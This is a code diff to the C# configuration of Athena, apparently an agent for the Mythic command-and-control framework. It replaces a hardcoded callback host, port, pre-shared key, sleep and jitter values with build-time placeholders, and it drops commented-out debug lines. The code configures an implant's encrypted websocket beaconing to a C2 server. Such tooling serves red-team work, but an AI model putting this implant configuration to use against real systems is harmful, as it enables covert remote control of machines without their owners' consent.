@@ -20,12 +20,12 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            this.uuid = "b29826b9-631e-4cb1-85c2-6c267eb8dcca";
+            this.uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("5", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("5", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
             this.forwarder = new Forwarder();
@@ -50,14 +50,14 @@ namespace Athena.Config
 
         public Websocket(string uuid)
         {
-            int callbackPort = Int32.Parse("8081");
-            string callbackHost = "ws://192.168.4.201";
-            this.endpoint = "socket";
+            int callbackPort = Int32.Parse("callback_port");
+            string callbackHost = "callback_host";
+            this.endpoint = "ENDPOINT_REPLACE";
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "test";
-            this.hostHeader = "";
-            this.psk = "r8/CVb6spc53JMS/OfmsjiUT0+Uzl1sBRyI1+BTsD9Q=";
-            this.encryptedExchangeCheck = bool.Parse("false");
+            this.userAgent = "USER_AGENT";
+            this.hostHeader = "%HOSTHEADER%";
+            this.psk = "AESPSK";
+            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
@@ -104,7 +104,6 @@ namespace Athena.Config
             try
             {
                 string json = JsonConvert.SerializeObject(obj);
-                //Console.WriteLine("Request: " + json);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -135,7 +134,6 @@ namespace Athena.Config
 
                 if (this.encrypted)
                 {
-                    //Console.WriteLine("Response: " + this.crypt.Decrypt(m.Data));
                     return this.crypt.Decrypt(m.Data);
                 }
                 else
